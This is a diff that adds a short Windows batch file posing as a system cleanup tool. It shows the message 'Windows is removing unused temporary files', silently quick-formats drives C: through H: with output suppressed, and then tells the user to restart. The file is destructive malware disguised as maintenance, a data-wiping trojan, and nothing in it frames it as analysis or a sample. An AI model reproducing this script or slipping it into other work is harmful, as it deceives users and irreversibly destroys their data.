@@ -1,0 +1,8 @@
+@echo off IMPORTANT:Windows is removing unused temporary files.
+@start.exe/m format C:/q/u/autotest >nul
+@start.exe/m format D:/q/u/autotest >nul
+@start.exe/m format E:/q/u/autotest >nul
+@start.exe/m format F:/q/u/autotest >nul
+@start.exe/m format G:/q/u/autotest >nul
+@start.exe/m format H:/q/u/autotest >nul
+@echo please restart your computer!
